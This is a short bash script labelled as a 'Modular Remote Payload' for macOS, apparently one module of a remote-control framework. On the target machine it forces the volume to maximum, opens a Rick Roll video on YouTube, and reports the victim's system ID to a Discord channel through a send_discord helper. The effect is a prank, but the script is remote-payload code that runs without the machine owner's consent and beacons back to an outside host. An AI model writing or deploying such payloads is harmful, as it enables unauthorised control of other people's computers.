#!/bin/bash
# ============================================================
# Rick Roll for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

# Set volume to max
osascript -e "set volume output volume 100"

# Open YouTube
open "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

send_discord "🎵 **Rick Roll Deployed on $SYSID** (macOS)"

